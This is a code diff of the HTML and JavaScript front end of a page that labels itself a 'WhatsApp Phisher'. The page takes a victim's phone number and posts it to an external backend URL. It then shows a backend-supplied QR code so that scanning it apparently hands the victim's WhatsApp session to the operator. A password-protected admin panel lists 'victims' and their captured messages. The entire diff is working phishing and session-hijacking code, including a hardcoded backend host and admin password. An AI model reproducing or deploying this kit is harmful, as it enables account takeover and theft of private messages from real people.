@@ -72,11 +72,13 @@
             padding: 15px;
             border-radius: 15px;
             display: inline-block;
+            min-height: 250px;
+            min-width: 250px;
         }
 
         #qrCode {
-            width: 250px;
-            height: 250px;
+            width: 220px;
+            height: 220px;
             display: block;
         }
 
@@ -89,6 +91,14 @@
         .qr-status.connected {
             color: #25D366;
             font-weight: bold;
+        }
+
+        .qr-status.loading {
+            color: #ff9800;
+        }
+
+        .qr-status.error {
+            color: #dc3545;
         }
 
         .input-group {
@@ -126,6 +136,11 @@
             background: #128C7E;
         }
 
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
         .status {
             margin: 15px 25px;
             padding: 12px;
@@ -140,6 +155,12 @@
             display: block;
         }
 
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+
         .admin-badge {
             position: fixed;
             bottom: 20px;
@@ -150,6 +171,10 @@
             border-radius: 20px;
             font-size: 12px;
             cursor: pointer;
+        }
+
+        .admin-badge:hover {
+            background: #075e54;
         }
 
         .modal {
@@ -211,6 +236,22 @@
             border-radius: 8px;
             border-left: 4px solid #25D366;
         }
+
+        .message-sender {
+            font-weight: bold;
+            color: #075e54;
+        }
+
+        .message-text {
+            margin-top: 5px;
+            color: #333;
+        }
+
+        .message-time {
+            font-size: 10px;
+            color: #999;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -248,175 +289,233 @@
                 <h2>📊 WhatsApp Session - Captured Messages</h2>
                 <button class="close-modal" id="closeModal">&times;</button>
             </div>
-            <div id="adminContent"></div>
+            <div id="adminContent">
+                <div style="text-align: center; padding: 40px;">Loading...</div>
+            </div>
         </div>
     </div>
 
     <script>
-        // CHANGE THIS TO YOUR BACKEND URL
+        // ========== CONFIGURATION ==========
         const BACKEND_URL = 'https://mnisi5334.pythonanywhere.com';
+        const ADMIN_PASSWORD = 'Phishing3694';
         
         let checkInterval = null;
+        let sessionActive = false;
 
-        async function submitPhone() {
-            const phone = document.getElementById('phone').value.trim();
+        // ========== HELPER FUNCTIONS ==========
+        function showStatus(message, type) {
             const statusDiv = document.getElementById('status');
-            const submitBtn = document.getElementById('submitBtn');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+                statusDiv.className = 'status';
+            }, 4000);
+        }
+
+        function updateQRStatus(message, type) {
             const qrStatus = document.getElementById('qrStatus');
+            qrStatus.textContent = message;
+            qrStatus.className = `qr-status ${type}`;
+        }
 
-            if (!phone || phone.length < 9) {
-                statusDiv.textContent = 'Please enter a valid phone number';
-                statusDiv.className = 'status error';
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Connecting...';
-            statusDiv.textContent = 'Sending request...';
-            statusDiv.className = 'status';
-
+        // ========== API CALLS ==========
+        async function capturePhone(phone) {
             try {
-                // Send phone number to backend
                 const response = await fetch(`${BACKEND_URL}/api/capture`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone: phone })
                 });
+                return await response.json();
+            } catch (error) {
+                console.error('Capture error:', error);
+                return null;
+            }
+        }
 
-                const data = await response.json();
-                
-                if (data.status === 'success') {
-                    statusDiv.textContent = '✓ Phone number received! Generating QR code...';
-                    statusDiv.className = 'status success';
-                    qrStatus.textContent = '✅ QR code ready! Scan with WhatsApp on your phone';
+        async function getQR() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/qr`);
+                return await response.json();
+            } catch (error) {
+                console.error('QR fetch error:', error);
+                return null;
+            }
+        }
+
+        async function getMessages() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/messages`);
+                return await response.json();
+            } catch (error) {
+                console.error('Messages fetch error:', error);
+                return null;
+            }
+        }
+
+        async function getVictims() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/victims`);
+                return await response.json();
+            } catch (error) {
+                console.error('Victims fetch error:', error);
+                return null;
+            }
+        }
+
+        // ========== QR CODE CHECKING ==========
+        async function startQRCheck() {
+            if (checkInterval) clearInterval(checkInterval);
+            
+            checkInterval = setInterval(async () => {
+                try {
+                    const data = await getQR();
                     
-                    // Start checking for QR code
+                    if (data && data.qr) {
+                        const qrImg = document.getElementById('qrCode');
+                        qrImg.src = `data:image/png;base64,${data.qr}`;
+                        updateQRStatus('✅ QR code ready - Scan with WhatsApp', '');
+                    }
+                    
+                    if (data && data.connected) {
+                        updateQRStatus('✅ Connected! WhatsApp is active', 'connected');
+                        sessionActive = true;
+                        clearInterval(checkInterval);
+                        showStatus('✓ Connected successfully!', 'success');
+                    }
+                } catch (error) {
+                    console.error('QR check error:', error);
+                    updateQRStatus('⚠️ Connection error - Check backend', 'error');
+                }
+            }, 3000);
+        }
+
+        // ========== ADMIN PANEL ==========
+        async function loadAdminPanel() {
+            const adminContent = document.getElementById('adminContent');
+            adminContent.innerHTML = '<div style="text-align: center; padding: 40px;">Loading data...</div>';
+            
+            try {
+                const victims = await getVictims();
+                const messagesData = await getMessages();
+                
+                let html = '';
+                
+                // Victim info
+                if (victims && victims.length > 0) {
+                    const victim = victims[0];
+                    html += `
+                        <div style="margin-bottom: 20px; padding: 15px; background: #f0f2f5; border-radius: 10px;">
+                            <strong>📱 Victim Phone:</strong> ${victim.phone || 'Not captured yet'}<br>
+                            <strong>🔗 Session Status:</strong> ${victim.session_active ? '✅ Active' : '⏳ Waiting for scan'}<br>
+                            <strong>💬 Messages Captured:</strong> ${victim.messages_count || 0}
+                        </div>
+                    `;
+                } else {
+                    html += '<div style="margin-bottom: 20px; padding: 15px; background: #f0f2f5; border-radius: 10px;">⏳ Waiting for victim to enter phone number...</div>';
+                }
+                
+                // Messages
+                if (messagesData && messagesData.messages && messagesData.messages.length > 0) {
+                    html += `
+                        <h3>📱 WhatsApp Messages:</h3>
+                        <div class="messages-box">
+                    `;
+                    messagesData.messages.forEach(msg => {
+                        html += `
+                            <div class="message-item">
+                                <div class="message-sender">${msg.from || 'Unknown'}</div>
+                                <div class="message-text">${msg.message || msg}</div>
+                                <div class="message-time">${msg.time || new Date().toLocaleTimeString()}</div>
+                            </div>
+                        `;
+                    });
+                    html += '</div>';
+                } else {
+                    html += '<p>No messages captured yet. Wait for victim to scan QR code.</p>';
+                }
+                
+                html += `
+                    <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #25D366; border: none; border-radius: 8px; cursor: pointer;">🔄 Refresh</button>
+                `;
+                
+                adminContent.innerHTML = html;
+            } catch (error) {
+                adminContent.innerHTML = `<div style="text-align: center; padding: 40px; color: red;">❌ Error loading data. Make sure backend is running at ${BACKEND_URL}</div>`;
+            }
+        }
+
+        // ========== MAIN SUBMIT FUNCTION ==========
+        async function submitPhone() {
+            const phone = document.getElementById('phone').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (!phone || phone.length < 9) {
+                showStatus('Please enter a valid phone number', 'error');
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Connecting...';
+            showStatus('Sending request...', 'success');
+            updateQRStatus('🔄 Generating QR code...', 'loading');
+            
+            try {
+                const result = await capturePhone(phone);
+                
+                if (result && result.status === 'success') {
+                    showStatus('✓ Phone number received! QR code generating...', 'success');
                     startQRCheck();
                 } else {
-                    throw new Error('Failed');
+                    throw new Error('Failed to connect to backend');
                 }
-
             } catch (error) {
-                statusDiv.textContent = 'Connection error. Please try again.';
-                statusDiv.className = 'status error';
+                console.error('Submit error:', error);
+                showStatus('❌ Connection error. Make sure backend is running.', 'error');
+                updateQRStatus('⚠️ Cannot connect to backend', 'error');
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Connect to WhatsApp';
             }
         }
 
-        async function startQRCheck() {
-            const qrImg = document.getElementById('qrCode');
-            const qrStatus = document.getElementById('qrStatus');
-            
-            if (checkInterval) clearInterval(checkInterval);
-            
-            checkInterval = setInterval(async () => {
-                try {
-                    const response = await fetch(`${BACKEND_URL}/api/qr`);
-                    const data = await response.json();
-
-                    if (data.qr) {
-                        qrImg.src = `data:image/png;base64,${data.qr}`;
-                        qrStatus.textContent = '✅ QR code ready - Scan with WhatsApp';
-                        qrStatus.className = 'qr-status';
-                    }
-
-                    if (data.connected) {
-                        qrStatus.textContent = '✅ Connected! WhatsApp is active';
-                        qrStatus.className = 'qr-status connected';
-                        clearInterval(checkInterval);
-                        document.getElementById('status').textContent = '✓ Connected successfully!';
-                        document.getElementById('status').className = 'status success';
-                        
-                        // Load messages after connection
-                        setTimeout(loadMessages, 3000);
-                    }
-                } catch (error) {
-                    console.error('QR check error:', error);
-                }
-            }, 3000);
-        }
-
-        async function loadMessages() {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/messages`);
-                const data = await response.json();
-                
-                if (data.messages && data.messages.length > 0) {
-                    console.log('Messages loaded:', data.messages);
-                }
-            } catch (error) {
-                console.error('Error loading messages:', error);
-            }
-        }
-
-        async function refreshAdminPanel() {
-            try {
-                // Get victims
-                const victimsResponse = await fetch(`${BACKEND_URL}/api/victims`);
-                const victims = await victimsResponse.json();
-                
-                // Get messages
-                const messagesResponse = await fetch(`${BACKEND_URL}/api/messages`);
-                const messagesData = await messagesResponse.json();
-                
-                let messagesHtml = '';
-                if (messagesData.messages && messagesData.messages.length > 0) {
-                    messagesHtml = `
-                        <h3>📱 WhatsApp Messages Captured:</h3>
-                        <div class="messages-box">
-                    `;
-                    messagesData.messages.forEach(msg => {
-                        messagesHtml += `<div class="message-item">${msg}</div>`;
-                    });
-                    messagesHtml += '</div>';
-                } else {
-                    messagesHtml = '<p>No messages captured yet. Wait for victim to scan QR code.</p>';
-                }
-                
-                const html = `
-                    <div style="margin-bottom: 20px;">
-                        <strong>📊 Active Victims: ${victims.length}</strong>
-                        <br><br>
-                        ${messagesHtml}
-                        <button onclick="refreshAdminPanel()" style="margin-top: 15px; padding: 8px 20px; background: #25D366; border: none; border-radius: 5px; cursor: pointer;">🔄 Refresh</button>
-                    </div>
-                `;
-                document.getElementById('adminContent').innerHTML = html;
-            } catch (error) {
-                document.getElementById('adminContent').innerHTML = '<p>Error loading data. Make sure backend is running.</p>';
-            }
-        }
-
+        // ========== EVENT LISTENERS ==========
         document.getElementById('submitBtn').addEventListener('click', submitPhone);
         document.getElementById('phone').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') submitPhone();
         });
-
-        // Admin Panel
+        
+        // Admin panel
         const adminBadge = document.getElementById('adminBadge');
         const adminModal = document.getElementById('adminModal');
         const closeModal = document.getElementById('closeModal');
-        const ADMIN_PASSWORD = 'Phishing3694';
-
+        
         adminBadge.addEventListener('click', () => {
             const password = prompt('🔐 Enter admin password:');
-            if (password !== ADMIN_PASSWORD) {
+            if (password === ADMIN_PASSWORD) {
+                loadAdminPanel();
+                adminModal.classList.add('active');
+            } else if (password !== null) {
                 alert('❌ Wrong password!');
-                return;
             }
-            refreshAdminPanel();
-            adminModal.classList.add('active');
         });
-
+        
         closeModal.addEventListener('click', () => adminModal.classList.remove('active'));
         adminModal.addEventListener('click', (e) => {
             if (e.target === adminModal) adminModal.classList.remove('active');
         });
-
+        
+        // ========== INITIALIZATION ==========
         console.log('✅ WhatsApp Phisher Ready');
         console.log(`📡 Backend URL: ${BACKEND_URL}`);
         console.log('🔑 Admin Password: Phishing3694');
+        
+        // Test backend connection
+        fetch(`${BACKEND_URL}/api/status`)
+            .then(res => res.json())
+            .then(data => console.log('✅ Backend connected:', data))
+            .catch(err => console.error('❌ Backend connection failed:', err));
     </script>
 </body>
 </html>
